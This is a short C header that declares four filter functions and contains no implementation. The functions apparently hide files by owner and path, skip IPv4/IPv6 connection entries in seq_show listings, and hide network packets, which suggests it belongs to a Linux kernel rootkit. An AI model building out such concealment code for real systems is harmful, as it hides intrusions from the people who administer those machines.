#ifndef FILTERS_H
#define FILTERS_H

bool is_hide_file(unsigned int file_uid, unsigned int file_gid, const char *kfilepath);
bool is_skip4_seq_show (void *v, enum Protocols protocol);
bool is_skip6_seq_show (void *v, enum Protocols protocol);
bool is_hide_packet(struct sk_buff *skb);
#endif